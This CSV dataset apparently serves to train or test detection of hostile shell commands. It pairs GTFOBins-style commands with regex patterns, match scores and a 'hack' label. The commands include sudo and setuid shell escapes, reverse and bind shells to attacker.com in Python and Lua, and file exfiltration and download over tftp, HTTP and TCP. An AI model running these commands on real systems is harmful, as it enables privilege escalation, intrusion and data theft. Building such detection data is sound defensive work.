ocode,code,word_count,match_count,match_score,hack
sudo tclsh,sudo tclsh,2,0,0.0,0
exec /bin/sh <@stdin >@stdout 2>@stderr,exec /bin/sh <@stdin >@stdout 2>@stderr,5,0,0.0,1
COMMAND='id',"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.3076923076923075,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo ""$COMMAND"" > $TF","echo ""\$COMMAND"" > \$TF",4,0,0.09090909090909091,0
chmod +x $TF,chmod \+x \$TF,3,0,0.15384615384615385,0
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF,tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z \$TF,12,0,0.020833333333333332,0
COMMAND='id',"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.3076923076923075,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo ""$COMMAND"" > $TF","echo ""\$COMMAND"" > \$TF",4,0,0.09090909090909091,0
chmod +x $TF,chmod \+x \$TF,3,0,0.15384615384615385,0
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root,sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z \$TF -Z root,15,0,0.01639344262295082,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"echo DATA | ./tee -a ""$LFILE""","echo DATA \| \./tee -a ""\$LFILE""",6,0,0.1,0
sudo install -m =xs $(which tee) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which tee\) \.",7,1,0.7714285714285715,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"echo DATA | ./tee -a ""$LFILE""","echo DATA \| \./tee -a ""\$LFILE""",6,0,0.1,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"echo DATA | sudo tee -a ""$LFILE""","echo DATA \| sudo tee -a ""\$LFILE""",7,0,0.06060606060606061,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
telnet $RHOST $RPORT,telnet \$RHOST \$RPORT,3,0,0.09523809523809523,0
!/bin/sh,!/bin/sh,1,0,0.0,1
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
TF=$(mktemp -u),[\w\-_]+=\$\(mktemp -u\),2,1,0.6875,0
mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF,mkfifo \$TF && telnet \$RHOST \$RPORT 0<\$TF \| /bin/sh 1>\$TF,10,0,0.10526315789473684,1
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
sudo telnet $RHOST $RPORT,sudo telnet \$RHOST \$RPORT,4,0,0.07692307692307693,0
!/bin/sh,!/bin/sh,1,0,0.0,1
sudo install -m =xs $(which telnet) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which telnet\) \.",7,1,0.7105263157894737,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
./telnet $RHOST $RPORT,\./telnet \$RHOST \$RPORT,3,0,0.13043478260869565,0
!/bin/sh,!/bin/sh,1,0,0.0,1
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
tftp $RHOST,tftp \$RHOST,2,0,0.08333333333333333,0
put file_to_send,put [\w\-_\/]+,2,1,0.6470588235294118,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
tftp $RHOST,tftp \$RHOST,2,0,0.08333333333333333,0
get file_to_get,get [\w\-_\/]+,2,1,0.6875,0
sudo install -m =xs $(which tftp) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which tftp\) \.",7,1,0.75,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
./tftp $RHOST,\./tftp \$RHOST,2,0,0.14285714285714285,0
put file_to_send,put [\w\-_\/]+,2,1,0.6470588235294118,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
sudo tftp $RHOST,sudo tftp \$RHOST,3,0,0.058823529411764705,0
put file_to_send,put [\w\-_\/]+,2,1,0.6470588235294118,0
/usr/bin/time /bin/sh,/usr/bin/time /bin/sh,2,0,0.0,1
sudo install -m =xs $(which time) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which time\) \.",7,1,0.75,0
./time /bin/sh -p,\./time /bin/sh -p,3,0,0.05555555555555555,1
sudo /usr/bin/time /bin/sh,sudo /usr/bin/time /bin/sh,3,0,0.0,1
timeout 7d /bin/sh,timeout 7d /bin/sh,3,0,0.0,1
sudo install -m =xs $(which timeout) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which timeout\) \.",7,1,0.6923076923076923,0
./timeout 7d /bin/sh -p,\./timeout 7d /bin/sh -p,4,0,0.041666666666666664,1
sudo timeout --foreground 7d /bin/sh,sudo timeout --foreground 7d /bin/sh,5,0,0.0,1
tmux,tmux,1,0,0.0,0
sudo tmux,sudo tmux,2,0,0.0,0
echo -e 'pipe/tx/texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprctop,"echo -c [\'|""]| -e [\'|""]|cat >.*<<.*pipe/tx/texec /bin/sh 1>&0 2>&0' >>~/\.config/procps/toprctop",7,1,0.4142857142857143,1
echo -e 'pipe/tx/texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprcsudo top,"echo -c [\'|""]| -e [\'|""]|cat >.*<<.*pipe/tx/texec /bin/sh 1>&0 2>&0' >>/root/\.config/procps/toprcsudo top",8,1,0.3670886075949367,1
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
troff $LFILE,troff \$LFILE,2,0,0.07692307692307693,0
sudo install -m =xs $(which troff) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which troff\) \.",7,1,0.7297297297297297,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
./troff $LFILE,\./troff \$LFILE,2,0,0.13333333333333333,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo troff $LFILE,sudo troff \$LFILE,3,0,0.05555555555555555,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"ul ""$LFILE""","ul ""\$LFILE""",2,0,0.08333333333333333,0
sudo install -m =xs $(which ul) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which ul\) \.",7,1,0.7941176470588235,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./ul ""$LFILE""","\./ul ""\$LFILE""",2,0,0.14285714285714285,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo ul ""$LFILE""","sudo ul ""\$LFILE""",3,0,0.058823529411764705,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"unexpand -t99999999 ""$LFILE""","unexpand -t99999999 ""\$LFILE""",3,0,0.034482758620689655,0
sudo install -m =xs $(which unexpand) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which unexpand\) \.",7,1,0.675,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./unexpand -t99999999 ""$LFILE""","\./unexpand -t99999999 ""\$LFILE""",3,0,0.06451612903225806,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo unexpand -t99999999 ""$LFILE""","sudo unexpand -t99999999 ""\$LFILE""",4,0,0.029411764705882353,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"uniq ""$LFILE""","uniq ""\$LFILE""",2,0,0.07142857142857142,0
sudo install -m =xs $(which uniq) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which uniq\) \.",7,1,0.75,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./uniq ""$LFILE""","\./uniq ""\$LFILE""",2,0,0.125,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo uniq ""$LFILE""","sudo uniq ""\$LFILE""",3,0,0.05263157894736842,0
unshare /bin/sh,unshare /bin/sh,2,0,0.0,1
sudo install -m =xs $(which unshare) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which unshare\) \.",7,1,0.6923076923076923,0
./unshare -r /bin/sh,\./unshare -r /bin/sh,3,0,0.047619047619047616,1
sudo unshare /bin/sh,sudo unshare /bin/sh,3,0,0.0,1
sudo install -m =xs $(which update-alternatives) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which update-alternatives\) \.",7,1,0.5294117647058824,0
LFILE=/path/to/file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.0344827586206897,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
echo DATA >$TF,echo DATA >\$TF,3,0,0.06666666666666667,0
"./update-alternatives --force --install ""$LFILE"" x ""$TF"" 0","\./update-alternatives --force --install ""\$LFILE"" x ""\$TF"" 0",7,0,0.05084745762711865,0
LFILE=/path/to/file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.0344827586206897,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
echo DATA >$TF,echo DATA >\$TF,3,0,0.06666666666666667,0
"sudo update-alternatives --force --install ""$LFILE"" x ""$TF"" 0","sudo update-alternatives --force --install ""\$LFILE"" x ""\$TF"" 0",8,0,0.03225806451612903,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"uuencode ""$LFILE"" /dev/stdout | uudecode","uuencode ""\$LFILE"" /dev/stdout \| uudecode",5,0,0.04878048780487805,0
sudo install -m =xs $(which uudecode) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which uudecode\) \.",7,1,0.675,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"uuencode ""$LFILE"" /dev/stdout | uudecode","uuencode ""\$LFILE"" /dev/stdout \| uudecode",5,0,0.04878048780487805,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo uuencode ""$LFILE"" /dev/stdout | uudecode","sudo uuencode ""\$LFILE"" /dev/stdout \| uudecode",6,0,0.043478260869565216,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"uuencode ""$LFILE"" /dev/stdout | uudecode","uuencode ""\$LFILE"" /dev/stdout \| uudecode",5,0,0.04878048780487805,0
sudo install -m =xs $(which uuencode) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which uuencode\) \.",7,1,0.675,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"uuencode ""$LFILE"" /dev/stdout | uudecode","uuencode ""\$LFILE"" /dev/stdout \| uudecode",5,0,0.04878048780487805,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo uuencode ""$LFILE"" /dev/stdout | uudecode","sudo uuencode ""\$LFILE"" /dev/stdout \| uudecode",6,0,0.043478260869565216,0
valgrind /bin/sh,valgrind /bin/sh,2,0,0.0,1
sudo valgrind /bin/sh,sudo valgrind /bin/sh,3,0,0.0,1
vi -c ':!/bin/sh' /dev/null,"vi -c [\'|""]| -e [\'|""]|cat >.*<<.*:!/bin/sh' /dev/null",4,1,1.0,1
vi,vi,1,0,0.0,0
:set shell=/bin/sh,":set [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.5789473684210527,0
:shell,:shell,1,0,0.0,0
vi file_to_write,vi [\w\-_\/]+,2,1,0.7058823529411765,0
iDATA,iDATA,1,0,0.0,0
w,w,1,0,0.0,0
vi file_to_read,vi [\w\-_\/]+,2,1,0.6875,0
sudo vi -c ':!/bin/sh' /dev/null,"sudo vi -c [\'|""]| -e [\'|""]|cat >.*<<.*:!/bin/sh' /dev/null",5,1,0.8484848484848485,1
view -c ':!/bin/sh',"view -c [\'|""]| -e [\'|""]|cat >.*<<.*:!/bin/sh'",3,1,1.4,1
view,view,1,0,0.0,0
:set shell=/bin/sh,":set [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.5789473684210527,0
:shell,:shell,1,0,0.0,0
"view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","view -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import os\; os\.execl\(""/bin/sh""\, ""sh""\, ""-c""\, ""reset\; exec sh""\)'",11,1,0.48,1
"view -c ':lua os.execute(""reset; exec sh"")'","view -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua os\.execute\(""reset\; exec sh""\)'",6,1,0.7272727272727273,0
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"view -c ':py import vim,sys,socket,os,pty;s=socket.socket()s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))[os.dup2(s.fileno(),fd) for fd in (0,1,2)]pty.spawn(""/bin/sh"")vim.command("":q!"")'","view -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\,sys\,socket\,os\,pty\;[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.socket\(\)s\.connect\(\(os\.getenv\(""RHOST""\)\,int\(os\.getenv\(""RPORT""\)\)\)\)os\.dup2\(s\.fileno\(\)\,fd\) for fd in \(0\,1\,2\)pty\.spawn\(""/bin/sh""\)vim\.command\("":q!""\)'",9,3,0.5051546391752577,1
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"view -c ':lua local s=require(""socket""); local t=assert(s.tcp());  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));  while true do    local r,x=t:receive();local f=assert(io.popen(r,""r""));    local b=assert(f:read(""*a""));t:send(b);  end;  f:close();t:close();'","view -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\; local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\(""RHOST""\)\,os\.getenv\(""RPORT""\)\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(io\.popen\(r\,""r""\)\)\;    local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(f:read\(""\*a""\)\)\;t:send\(b\)\;  end\;  f:close\(\)\;t:close\(\)\;'",28,11,0.8625954198473282,0
export LPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"view -c ':lua local k=require(""socket"");  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));  local c=s:accept();  while true do    local r,x=c:receive();local f=assert(io.popen(r,""r""));    local b=assert(f:read(""*a""));c:send(b);  end;c:close();f:close();'","view -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(k\.bind\(""\*""\,os\.getenv\(""LPORT""\)\)\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:accept\(\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(io\.popen\(r\,""r""\)\)\;    local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(f:read\(""\*a""\)\)\;c:send\(b\)\;  end\;c:close\(\)\;f:close\(\)\;'",28,13,1.0039370078740157,0
export URL=http://attacker.com/,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/",2,2,1.0,0
export LFILE=file_to_send,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"view -c ':py import vim,sys; from os import environ as eif sys.version_info.major == 3: import urllib.request as r, urllib.parse as uelse: import urllib as u, urllib2 as rr.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))vim.command("":q!"")'","view -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import urllib\.request as r\, urllib\.parse as uelse: import urllib as u\, urllib2 as rr\.urlopen\(e""URL""\, bytes\(u\.urlencode\({""d"":open\(e""LFILE""\)\.read\(\)}\)\.encode\(\)\)\)vim\.command\("":q!""\)'",29,2,0.2932330827067669,0
export LPORT=8888,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.7222222222222223,0
"view -c ':py import vim,sys; from os import environ as eif sys.version_info.major == 3: import http.server as s, socketserver as sselse: import SimpleHTTPServer as s, SocketServer as ssss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()vim.command("":q!"")'","view -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import http\.server as s\, socketserver as sselse: import SimpleHTTPServer as s\, SocketServer as ssss\.TCPServer\(\(""""\, int\(e""LPORT""\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)vim\.command\("":q!""\)'",30,2,0.25886524822695034,0
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_send,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"view -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')  local d=f:read(""*a"")  io.close(f);  local s=require(""socket"");  local t=assert(s.tcp());  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));  t:send(d);  t:close();'","view -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.open\(os\.getenv\(""LFILE""\)\, 'rb'\)  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:read\(""\*a""\)  io\.close\(f\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\(""RHOST""\)\,os\.getenv\(""RPORT""\)\)\;  t:send\(d\)\;  t:close\(\)\;'",23,9,0.8558558558558559,0
export URL=http://attacker.com/file_to_get,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",2,3,1.0,0
export LFILE=file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"view -c ':py import vim,sys; from os import environ as eif sys.version_info.major == 3: import urllib.request as relse: import urllib as rr.urlretrieve(e[""URL""], e[""LFILE""])vim.command("":q!"")'","view -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import urllib\.request as relse: import urllib as rr\.urlretrieve\(e""URL""\, e""LFILE""\)vim\.command\("":q!""\)'",23,2,0.328042328042328,0
export LPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"view -c ':lua local k=require(""socket"");  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));  local c=s:accept();  local d,x=c:receive(""*a"");  c:close();  local f=io.open(os.getenv(""LFILE""), ""wb"");  f:write(d);  io.close(f);'","view -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(k\.bind\(""\*""\,os\.getenv\(""LPORT""\)\)\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:accept\(\)\;  local d\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:receive\(""\*a""\)\;  c:close\(\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.open\(os\.getenv\(""LFILE""\)\, ""wb""\)\;  f:write\(d\)\;  io\.close\(f\)\;'",24,11,0.9955156950672646,0
view file_to_write,view [\w\-_\/]+,2,1,0.631578947368421,0
iDATA,iDATA,1,0,0.0,0
w!,w!,1,0,0.0,0
view file_to_read,view [\w\-_\/]+,2,1,0.6111111111111112,0
"view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'","view -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\; from ctypes import cdll\; cdll\.LoadLibrary\(""lib\.so""\)\; vim\.command\("":q!""\)'",11,1,0.3877551020408163,0
sudo install -m =xs $(which view) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which view\) \.",7,1,0.75,0
"./view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'","\./view -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import os\; os\.execl\(""/bin/sh""\, ""sh""\, ""-pc""\, ""reset\; exec sh -p""\)'",12,1,0.4567901234567901,1
sudo view -c ':!/bin/sh',"sudo view -c [\'|""]| -e [\'|""]|cat >.*<<.*:!/bin/sh'",4,1,1.12,1
"sudo view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","sudo view -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import os\; os\.execl\(""/bin/sh""\, ""sh""\, ""-c""\, ""reset\; exec sh""\)'",12,1,0.45,1
"sudo view -c ':lua os.execute(""reset; exec sh"")'","sudo view -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua os\.execute\(""reset\; exec sh""\)'",7,1,0.6530612244897959,0
cp $(which view) .,cp \$\(which view\) \.,4,0,0.21052631578947367,0
sudo setcap cap_setuid+ep view,sudo setcap cap_setuid\+ep view,4,0,0.03225806451612903,0
"./view -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","\./view -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import os\; os\.setuid\(0\)\; os\.execl\(""/bin/sh""\, ""sh""\, ""-c""\, ""reset\; exec sh""\)'",12,1,0.45054945054945056,1
sudo install -m =xs $(which view) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which view\) \.",7,1,0.75,0
"./view -c ':lua os.execute(""reset; exec sh"")'","\./view -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua os\.execute\(""reset\; exec sh""\)'",6,1,0.717391304347826,0
sudo install -m =xs $(which vigr) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which vigr\) \.",7,1,0.75,0
./vigr,\./vigr,1,0,0.14285714285714285,0
sudo vigr,sudo vigr,2,0,0.0,0
vim -c ':!/bin/sh',"vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:!/bin/sh'",3,1,1.4736842105263157,1
vim,vim,1,0,0.0,0
:set shell=/bin/sh,":set [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.5789473684210527,0
:shell,:shell,1,0,0.0,0
"vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import os\; os\.execl\(""/bin/sh""\, ""sh""\, ""-c""\, ""reset\; exec sh""\)'",11,1,0.4864864864864865,1
"vim -c ':lua os.execute(""reset; exec sh"")'","vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua os\.execute\(""reset\; exec sh""\)'",6,1,0.7441860465116279,0
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))[os.dup2(s.fileno(),fd) for fd in (0,1,2)]pty.spawn(""/bin/sh"")vim.command("":q!"")'","vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\,sys\,socket\,os\,pty\;[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.socket\(\)s\.connect\(\(os\.getenv\(""RHOST""\)\,int\(os\.getenv\(""RPORT""\)\)\)\)os\.dup2\(s\.fileno\(\)\,fd\) for fd in \(0\,1\,2\)pty\.spawn\(""/bin/sh""\)vim\.command\("":q!""\)'",9,3,0.5077720207253886,1
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
